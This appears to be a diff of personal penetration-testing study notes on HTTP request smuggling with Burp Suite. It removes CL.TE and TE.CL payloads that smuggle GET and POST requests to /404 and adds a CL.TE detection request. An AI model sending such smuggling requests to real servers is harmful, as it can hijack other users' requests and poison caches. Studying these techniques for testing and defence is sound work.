@@ -6,43 +6,36 @@ Change request method
 We have to receive HTTP /1 200 OK 
 
 Extension: HTTP Request Smuggler -> Launch all scans
+
+Repeater --> uncheck Update Content-Length 
+
+![[Pasted image 20240815102523.png]]
+
+![[Pasted image 20240815101327.png]]
+
+![[Pasted image 20240815101531.png]]
 # CL.TE
-
+Detect
 ```
-Content-Length: 0
-Transfer-encoding: chunked
+Content-Length: 6
+Transfer-Encoding: chunked
 
-0
-
-GET /404 HTTP/1.1
-X-Ignore: X
+3
+abc
+X
 ```
 
-Sent 2 times. The 2nd time 404
 
-x= 
+
+
 # TE.CL
 
-Repeater --> uncheck Update Content-Length
-
-```
-Content-Length: 4
-Transfer-encoding: chunked
-
-5e
-POST /404 HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
-0
 
 
-```
 
-![[Pasted image 20240814132824.png]]
 
-![[Pasted image 20240814132925.png]]
+
+
 
 
 
